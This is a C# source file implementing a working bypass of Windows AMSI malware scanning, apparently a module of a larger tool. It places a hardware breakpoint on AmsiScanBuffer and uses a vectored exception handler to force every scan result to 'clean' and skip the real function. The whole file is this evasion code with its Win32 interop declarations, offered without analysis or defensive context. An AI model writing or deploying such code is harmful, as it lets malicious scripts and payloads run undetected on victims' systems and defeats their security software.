using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SXVM
{
    internal static class HardwareBreakpointAmsiPatch
    {
        private static IntPtr pABuF = IntPtr.Zero;
        private static IntPtr pCtx = IntPtr.Zero;

        private class HardwareBreakpointAmsiPatchHandlerMethod : Attribute
        {
        }

        internal static void Bypass()
        {
            pABuF = GetProcAddress(LoadLibrary(@"amsi.dll"), @"AmsiScanBuffer");
            pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(CONTEXT64)));
            CONTEXT64 ctx = new CONTEXT64();
            ctx.ContextFlags = CONTEXT64_FLAGS.CONTEXT64_ALL;
            MethodInfo method = null;
            bool method_found = false;
            foreach (MethodInfo mi in typeof(HardwareBreakpointAmsiPatch).GetMethods(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance))
            {
                foreach (CustomAttributeData customAttribute in mi.CustomAttributes)
                {
                    if (customAttribute.AttributeType == typeof(HardwareBreakpointAmsiPatchHandlerMethod))
                    {
                        method = mi;
                        method_found = true;
                        break;
                    }
                    else
                    {
                    }
                }
                if (method_found == true)
                {
                    break;
                }
                else
                {
                }
            }
            IntPtr hExHandler = AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
            Marshal.StructureToPtr(ctx, pCtx, true);
            bool b = GetThreadContext((IntPtr)(-2), pCtx);
            ctx = (CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(CONTEXT64));
            EnableBreakpoint(ctx, pABuF, 0);
            SetThreadContext((IntPtr)(-2), pCtx);
        }

        [HardwareBreakpointAmsiPatchHandlerMethod]
        private static long Handler(IntPtr exceptions)
        {
            EXCEPTION_POINTERS ep = new EXCEPTION_POINTERS();
            ep = (EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptions, typeof(EXCEPTION_POINTERS));
            EXCEPTION_RECORD ExceptionRecord = new EXCEPTION_RECORD();
            ExceptionRecord = (EXCEPTION_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(EXCEPTION_RECORD));
            CONTEXT64 ContextRecord = new CONTEXT64();
            ContextRecord = (CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(CONTEXT64));
            if (ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP && ExceptionRecord.ExceptionAddress == pABuF)
            {
                ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);
                IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8)));
                Marshal.WriteInt32(ScanResult, 0, AMSI_RESULT_CLEAN);
                ContextRecord.Rip = ReturnAddress;
                ContextRecord.Rsp += 8;
                ContextRecord.Rax = 0;
                Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true);
                return EXCEPTION_CONTINUE_EXECUTION;
            }
            else
            {
                return EXCEPTION_CONTINUE_SEARCH;
            }
        }

        private static void EnableBreakpoint(CONTEXT64 ctx, IntPtr address, int index)
        {
            switch (index)
            {
                case 0:
                    ctx.Dr0 = (ulong)address.ToInt64();
                    break;
                case 1:
                    ctx.Dr1 = (ulong)address.ToInt64();
                    break;
                case 2:
                    ctx.Dr2 = (ulong)address.ToInt64();
                    break;
                case 3:
                    ctx.Dr3 = (ulong)address.ToInt64();
                    break;
            }
            ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);
            ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
            ctx.Dr6 = 0;
            Marshal.StructureToPtr(ctx, pCtx, true);
        }

        private static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
        {
            ulong mask = (1UL << bits) - 1UL;
            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
            return dw;
        }

        private const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
        private const Int32 EXCEPTION_CONTINUE_SEARCH = 0;

        private const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;

        private const Int32 AMSI_RESULT_CLEAN = 0;

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("Kernel32.dll")]
        private static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);

        [Flags]
        private enum CONTEXT64_FLAGS : uint
        {
            CONTEXT64_AMD64 = 0x100000,
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        private struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        private struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT64_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] public uint[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct EXCEPTION_POINTERS
        {
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }
    }
}
